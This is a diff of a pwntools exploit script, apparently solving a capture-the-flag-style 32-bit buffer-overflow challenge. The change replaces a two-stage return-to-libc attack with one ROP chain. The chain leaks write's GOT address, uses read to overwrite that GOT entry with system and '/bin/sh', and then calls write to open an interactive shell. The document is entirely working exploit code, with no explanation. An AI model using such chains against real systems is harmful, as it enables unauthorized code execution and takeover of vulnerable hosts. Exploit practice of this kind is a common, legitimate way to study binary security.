@@ -42,28 +42,29 @@ else:
 
 def main():
     io.recvuntil(":\n")
-    payload = flat((
+    payload1 = flat((
         "A" * (0x88 + 4),
         p32(elf.sym["write"]),
-        p32(elf.sym["_start"]),
+        # p32(elf.sym["_start"]),
+        p32(0x08048519),  # POP * 3
         p32(1),
         p32(elf.got["write"]),
         p32(4),
+        p32(elf.sym["read"]),
+        p32(0x08048519),  # POP * 3
+        p32(0),
+        p32(elf.got["write"]),
+        p32(12),
+        p32(elf.sym["write"]),
+        p32(0xdeadbeef),
+        p32(elf.got["write"] + 4),
     ))
-    io.send(payload)
-    # sleep(0.5)
+    io.send(payload1)
     write_addr = u32(io.recv(4))
     log.success("write_addr = 0x%x", write_addr)
     libc.address = write_addr - libc.sym["write"]
-    bin_sh_addr = next(libc.search(b"/bin/sh"))
-    io.recvuntil(":\n")
-    payload = flat((
-        "A" * (0x88 + 4),
-        p32(libc.sym["system"]),
-        p32(0xdeadbeef),
-        p32(bin_sh_addr),
-    ))
-    io.send(payload)
+    payload2 = p32(libc.sym["system"]) + b"/bin/sh\0"
+    io.send(payload2)
     io.interactive()
 
 if __name__ == "__main__":
